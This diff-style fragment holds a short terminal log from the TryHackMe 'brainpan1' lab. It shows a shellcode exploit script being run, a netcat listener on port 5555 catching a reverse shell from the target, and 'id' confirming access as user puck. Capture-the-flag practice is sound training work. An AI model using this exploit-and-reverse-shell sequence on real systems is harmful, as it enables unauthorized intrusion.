@@ -1,0 +1,12 @@
+
+root@kali:/opt/TryHackMe/brainpan1# ./22_shellcode_linux.py
+
+
+root@kali:~# nc -nlvp 5555
+listening on [any] 5555 ...
+connect to [10.8.147.132] from (UNKNOWN) [10.10.237.189] 58677
+
+
+id
+uid=1002(puck) gid=1002(puck) groups=1002(puck)
+
